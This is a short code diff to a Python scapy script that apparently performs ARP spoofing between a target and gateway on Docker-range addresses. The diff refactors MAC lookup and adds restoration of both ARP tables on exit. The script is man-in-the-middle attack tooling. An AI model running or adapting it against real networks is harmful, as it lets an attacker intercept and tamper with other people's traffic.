@@ -9,21 +9,12 @@ target_ip = '172.17.0.3'
 gateway_ip = '172.17.0.1'
 
 
-def get_arp_request(target_ip):
-    return scapy.ARP(pdst=target_ip)
-
-
-def get_broadcast():
-    return scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
-
-
 def get_mac(target_ip):
-    arp_request = get_arp_request(target_ip)
-    broadcast = get_broadcast()
+    arp_request = scapy.ARP(pdst=target_ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast,
                               timeout=1, verbose=False)[0]
-
     return answered_list[0][1].hwsrc
 
 
@@ -51,5 +42,6 @@ try:
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print('[+] Detected Ctrl-c. Reseting ARP tables; please wait.')
+    print('\r[+] Detected Ctrl-c. Reseting ARP tables; please wait.', end='')
     restore_mac(target_ip, gateway_ip)
+    restore_mac(gateway_ip, target_ip)
